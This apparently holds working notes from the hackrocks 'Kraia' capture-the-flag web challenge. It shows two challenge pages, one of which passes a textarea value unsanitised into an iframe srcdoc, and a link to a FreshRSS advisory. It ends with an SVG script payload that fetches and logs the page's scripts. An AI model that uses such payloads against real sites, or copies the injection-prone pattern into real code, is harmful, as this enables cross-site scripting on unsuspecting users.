@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Kraia - hackrocks</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- cache -->
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+
+  <link rel="stylesheet" href="style.css">
+
+  <link href="https://hackrocks.com/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
+  <link href="https://hackrocks.com/assets/images/webclip.png" rel="apple-touch-icon">
+</head>
+<body>
+  <h1>NeonFrame Studio</h1>
+  <p>Welcome to the future of web design. Only the bold may enter.</p>
+  <button onclick="window.location.href='admin.php'">Admin Panel</button>
+  <!-- Kraia siempre deja pistas en lo visual. Mira más allá del color. -->
+  <!-- Tal vez /panel-design.html sea útil -->
+</body>
+</html>
+
+https://challenges.hackrocks.com/kraia/panel-design.html
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Cyberpunk SVG Panel</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- cache -->
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+
+  <style>
+    body {
+      background-color: black;
+      color: #f0f;
+      font-family: 'Courier New', Courier, monospace;
+      animation: glow 2s infinite alternate;
+    }
+    h1 { color: #39ff14; }
+    textarea {
+      width: 80%;
+      height: 120px;
+      background-color: #111;
+      color: #39ff14;
+      border: 2px solid #ff00ff;
+      margin-top: 20px;
+      font-family: 'Courier New', monospace;
+    }
+    button {
+      margin-top: 10px;
+      background: linear-gradient(90deg, #39ff14, #ff00ff);
+      color: black;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+
+  <link href="https://hackrocks.com/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
+  <link href="https://hackrocks.com/assets/images/webclip.png" rel="apple-touch-icon">
+</head>
+<body>
+  <h1>⚡ Diseño Neón ⚡</h1>
+  <p>Este panel no es lo que parece.</p>
+
+  <textarea id="svgInput" placeholder="Pega aquí tu SVG payload..."></textarea><br>
+  <button onclick="injectSVG()">Render SVG</button>
+
+  <div id="preview"></div>
+
+  <script>
+    function injectSVG(){
+      const svgCode = document.getElementById('svgInput').value;
+      document.getElementById('preview').innerHTML = `<iframe srcdoc="${svgCode}" style="width:300px;height:200px;"></iframe>`;
+    }
+  </script>
+
+  <p><a href="admin.php">¿Ya tienes acceso?</a></p>
+</body>
+</html>
+
+https://github.com/FreshRSS/FreshRSS/security/advisories/GHSA-wgrq-mcwc-8f8v
+
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>
+(async () => {
+  const scripts = [...document.querySelectorAll("script[src]")];
+
+  for (const s of scripts) {
+    try {
+      const txt = await fetch(s.src).then(r => r.text());
+      console.log("[SRC] " + s.src, "\n" + txt);
+    } catch (e) {
+      console.log("[ERR] " + s.src, e);
+    }
+  }
+})();
+</script>
+</svg>
